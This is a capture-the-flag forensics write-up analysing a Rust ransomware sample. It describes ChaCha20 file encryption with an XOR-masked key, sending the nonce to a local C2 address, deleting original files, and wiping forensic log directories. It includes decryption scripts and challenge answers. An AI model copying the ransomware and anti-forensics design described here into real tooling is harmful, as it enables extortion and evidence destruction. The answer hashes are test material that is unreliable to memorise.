+<h4 class="group head-tag" id="openfile">OpenFile<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#openfile"></a></h4><p>Opening the open_file function we see</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-102.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>hence we name it to be open_file</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-103.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>now we can see the file contents as well</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-104.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<h4 class="group head-tag" id="random_num_generator">Random_num_generator<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#random_num_generator"></a></h4><p>we come across another function which only seems to take two args</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-105.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>opening it we see,</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-106.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>So now we have renamed it as</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-107.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>we can see the RandomBuffer is now stored on the stack</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-108.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>The actual encryption</p>
+<p>We see two function calls here</p>
+<ul>
+<li>sub_7FF7922F8600()</li>
+<li>sub_7FF7922F88B0()</li>
+</ul>
+<p>Coming to the first one</p>
+<h4 class="group head-tag" id="sub_7ff7922f8600">sub_7FF7922F8600()<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#sub_7ff7922f8600"></a></h4><pre tabindex="0"><code>sub_7FF7922F8600(&amp;RandomBuffer, &amp;random_buffer, 32LL, random_24_bytes_val, 12LL)
+</code></pre><p>The arguments it takes are :</p>
+<p>Arg 1 and 2 RandomBuffer that we just generated right now</p>
+<p>Arg 3 : 32</p>
+<p>Arg4: previously generated 24 bytes random value</p>
+<p>Arg 5 :12</p>
+<p>A major point to note is that this doesn&rsquo;t involve our file_contents at all</p>
+<p>Entering inside this function, this is what it looks like</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-109.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>we see strings like chacha20 which certainly do pique an interest here.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-110.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>We see another function being called internally</p>
+<p><code>sub_7FF7922F86C0()</code></p>
+<p>which returns the value in v10</p>
+<p>and now v10 contains</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-111.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p><code>expand 32-byte k</code></p>
+<p>curious on this we google and a small googling let&rsquo;s us know that this is the initial state of the chacha20 encryption alrogithm</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-112.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Therefore now we can rename this funtion as init_chacha20</p>
+<p>And googling more about chacha20 in rust gives us 
+<a
+  href="https://docs.rs/chacha20/latest/chacha20/"
+  
+    target="_blank"
+  
+  >this page</a
+>
+</p>
+<p>in this we can clearly see that chacha makes use of a 32 byte key(which in our case is random_buffer)
+and a 12 byte nonce(which in our case is the 24 byte random_val)</p>
+<p>we keep that in mind that it takes only the top 12 bytes of this 24 byte random_val</p>
+<h4 class="group head-tag" id="sub_7ff7922f88b0">sub_7FF7922F88B0()<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#sub_7ff7922f88b0"></a></h4><p>Coming to the second function, we now see</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-113.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Arg1 : <code>expand 32-byte k</code> followed by the random_buffer in memory followed by the first 12 bytes of the 24_byte_val</p>
+<p>Arg2 : file_contents</p>
+<p>Arg3 : A number(assuming it&rsquo;s the size of the file)</p>
+<p>Arg4 : unsure</p>
+<p>Arg 5: unsure</p>
+<p>Arg 1:</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-114.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>followed by the 32 byte random value</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-115.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-116.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>this followed by the 12 byte nonce</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-117.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>all of this is on the stack and now this aligns with what we saw in the rust documentation and hence, now we are able to get a clear picture on how and what it is encrypting</p>
+<p>we basically have the random_val and the nonce that is needed to encrypt and decrypt in chacha20</p>
+<h4 class="group head-tag" id="encrypted-data">Encrypted Data<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#encrypted-data"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-118.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>After encryption the location where the 12 byte nonce was stored is where the encrypted data is stored as well, the pointer is being overwritten</p>
+<h4 class="group head-tag" id="suspicious-xorring">Suspicious xorring<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#suspicious-xorring"></a></h4><p>This is pertaining to the earlier suspicious group of bytes that we saw getting pushed into xmm words</p>
+<p>rn the very same byts that are storred in xmm8 and xmm7 are getting xorred with the 32 byte random value that we just generated</p>
+<h4 class="group head-tag" id="writing-to-encrypted-file">Writing to encrypted file<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#writing-to-encrypted-file"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-119.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>This xorred value is now being appended to the very end of the file_data that we just encrypted.</p>
+<p>This helps us recover the randomvalues that were generated for each file</p>
+<p>Meaning, to decrypt now we have got the random_32_byte key we would only require a 12 byte nonce that needs to be used in decrypting</p>
+<p>And right now finally as everything goes, we take the encrytped bytes and write it into the new file that we just generated with the .azr43l extension</p>
+<h4 class="group head-tag" id="delete-old-file">Delete old file<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#delete-old-file"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-120.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Once the new file has been written now, there is no need to keep the original old file around which is now getting deleted from the system</p>
+<p>And the rest of this function is just clearing memory spaces and freeing the heap</p>
+<p>And thus that brings us to the end of the encrypt function</p>
+<h4 class="group head-tag" id="out-of-encrypt">Out of Encrypt<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#out-of-encrypt"></a></h4><p>After getting out of the encrypt function we continue down into the code</p>
+<p>we see it assigning new path now, but because it follows the same routine I don&rsquo;t want to bloat the writeup with redundant info</p>
+<h4 class="group head-tag" id="encrypting-desktop">Encrypting desktop<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#encrypting-desktop"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-122.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>This block of code encrypts the desktop content</p>
+<h4 class="group head-tag" id="encrypting-notepad">Encrypting notepad++<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#encrypting-notepad"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-123.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Then it goes onto encrypt data at
+<code>C:\Users\Ryuzaki\AppData\Roaming\Notepad++</code></p>
+<h4 class="group head-tag" id="encrypting-documents">Encrypting Documents<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#encrypting-documents"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-124.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<h4 class="group head-tag" id="socketconnection">SocketConnection<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#socketconnection"></a></h4><p>Now we get to the intersting part again, different from the few previous code blocks</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-125.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>We see here what looks like an IP addr</p>
+<p><code>192.168.1.33</code></p>
+<p>and right below we seem to have been given the port</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-126.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Now hObject seems to be initialized with ip and port binding them into a single struct for sockets</p>
+<p>as we track hObject we see it is being passed onto</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-127.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>which takes the IP , Port and the random_24_byte_val, which we now know to be the nonce</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-128.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>it sends the nonce to IP <code>192.168.1.33:6969</code></p>
+<h4 class="group head-tag" id="sub_1400024b0">sub_1400024B0()<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#sub_1400024b0"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-129.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>And last but not least we come to the final function which is yet to be analysed</p>
+<p>Going into the function we see it has all these strings,</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-130.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>and we see a bunch of function calls of the same function(sub_1400172B0) but with different strings as different args</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-131.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Going into the function we see a lot of calls</p>
+<ul>
+<li>NtCreateFile</li>
+<li>GetFileInformationByHandleEx</li>
+<li>DuplicateHandle</li>
+<li>GetCurrentProcess</li>
+</ul>
+<p>We could look into the paths</p>
+<ul>
+<li>C:\Windows\System32\winevt\Logs</li>
+<li>C:\Windows\Prefetch</li>
+<li>C:\Windows\Temp</li>
+<li>C:\Users\Public\Documents\Recent</li>
+<li>C:$Recycle.Bin</li>
+<li>C:\Windows\Logs</li>
+<li>C:\Windows\System32\config</li>
+<li>C:\Windows\SoftwareDistribution</li>
+</ul>
+<p>And after analysis, it&rsquo;s easy to understand and to formulate a hunch that this particular funtion was meant to remove all the files inside these directories of valuable DFIR artefacts as well for anti-forensic purposes.</p>
+<p>now as the anlysis is over , we will go ahead and answer the questions</p>
+<pre tabindex="0"><code>192.168.1.33:6969
+</code></pre><h4 class="group head-tag" id="question-6">Question 6<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-6"></a></h4><p>Q6) What is the nonce required to decrypt all the files affected by the ransomware?
+Format: md5(nonce)</p>
+<p>we know that the nonce is the 12 byte random value that was generated, and we can see processdumps/minidumps in the challenge file in
+/LogicalFileSet1/chall/Users/DukeThomas/procdumps as well as
+/LogicalFileSet1/chall/Users/DukeThomas/</p>
+<p>so we can make a easy script to do it or we can debug the dumps/dump,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">ChaCha20</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">Counter</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_nonce</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">input_string</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">input_string</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">nonce_pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;([0-9a-zA-Z]</span><span class="si">{12}</span><span class="s2">)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">nonces</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">nonce_pattern</span><span class="p">,</span> <span class="n">input_string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">nonces</span> <span class="o">=</span> <span class="n">nonces</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">repeating</span> <span class="o">=</span> <span class="p">[</span><span class="n">k</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">Counter</span><span class="p">(</span><span class="n">nonces</span><span class="p">)</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="k">if</span> <span class="n">v</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">repeating</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_chacha20</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">ChaCha20</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="n">key</span><span class="p">,</span> <span class="n">nonce</span><span class="o">=</span><span class="n">nonce</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">plaintext</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">nonce</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ct</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">encKey</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ct</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span> <span class="o">-</span> <span class="mi">32</span> <span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">ct</span><span class="p">)]]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xorkey</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s2">&#34;98238588864125956469313398338937&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">key</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">encKey</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">xorkey</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">nonce</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">nonce</span><span class="p">,</span> <span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted_data</span> <span class="o">=</span> <span class="n">decrypt_chacha20</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="n">ct</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89</span><span class="s2">PNG</span><span class="se">\r\n\x1a\n</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="n">decrypted_data</span><span class="p">[:</span><span class="mi">8</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;.azr43l&#34;</span><span class="p">),</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Nonce: &#34;</span><span class="p">,</span> <span class="n">nonce</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Key: &#34;</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">dumpPath</span> <span class="o">=</span> <span class="s2">&#34;mssetup.exe.dmp&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">encImagePath</span> <span class="o">=</span> <span class="s2">&#34;15.png.azr43l&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">dumpPath</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">potential_nonce</span> <span class="o">=</span> <span class="n">find_nonce</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">potential_nonce</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Potential nonces found...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;No potential nonces found...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">nonce</span> <span class="ow">in</span> <span class="n">potential_nonce</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">main</span><span class="p">(</span><span class="n">encImagePath</span><span class="p">,</span> <span class="n">nonce</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Cannot find the correct nonce...&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>as we have encrypted png , I just made a easy script to find the nonce and decrypt any file.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-132.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>or we can debug and find it just like we did it on Batman Investigation 1</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-134.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<pre tabindex="0"><code>F2E44EB1F60F
+
+cec72ce0ac9b9e20288bb66bf5f1c95a
+</code></pre><h4 class="group head-tag" id="question-7">Question 7<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-7"></a></h4><p>Q7) What is the password noted down of the site he tried to access and what is stored in the site?
+Format: md5(password)_md5(data-in-the-site)</p>
+<p>as we have notepad++ and it encrypts that too, we will have a look into it.</p>
+<p>but before that we will make a easy script to decrypt the file as we already know the nonce</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">ChaCha20</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_chacha20</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">ChaCha20</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="n">key</span><span class="p">,</span> <span class="n">nonce</span><span class="o">=</span><span class="n">nonce</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">plaintext</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">nonce</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ct</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">encKey</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ct</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span><span class="o">-</span><span class="mi">32</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">ct</span><span class="p">)]]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xorkey</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s2">&#34;98238588864125956469313398338937&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">key</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">encKey</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">xorkey</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">nonce</span>  <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">nonce</span><span class="p">,</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Nonce: &#34;</span><span class="p">,</span><span class="n">nonce</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Key: &#34;</span><span class="p">,</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted_data</span> <span class="o">=</span> <span class="n">decrypt_chacha20</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="n">ct</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;.azr43l&#34;</span><span class="p">),</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">(</span><span class="s1">&#39;15.png.azr43l&#39;</span><span class="p">,</span><span class="s2">&#34;F2E44EB1F60F&#34;</span><span class="p">)</span>
+</span></span></code></pre></div>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-133.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>let&rsquo;s get the backup changelog and decrypt it</p>
+<pre tabindex="0"><code> pastebin - PFA6}&gt;C&#34;lbqUUX1M5i;J
+ browser Secret key: b&#39;Y\x17\x08JS\xe5\xdd\ny\xa9 \x00T\x91\xcd\x8b\x86\xaf\xcc\x1dDzi\xbf7\xb49\x81\xdd\x9f\x19\x9a&#39;
+</code></pre><p>now we can see something like a password and a browser secret key is stored. let&rsquo;s get to his browser history which is chrome.</p>
+<p>Users/DukeThomas/AppData/Local/Google/Chrome/User Data/Default/History file will help us with finding the user history of chrome history</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-136.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
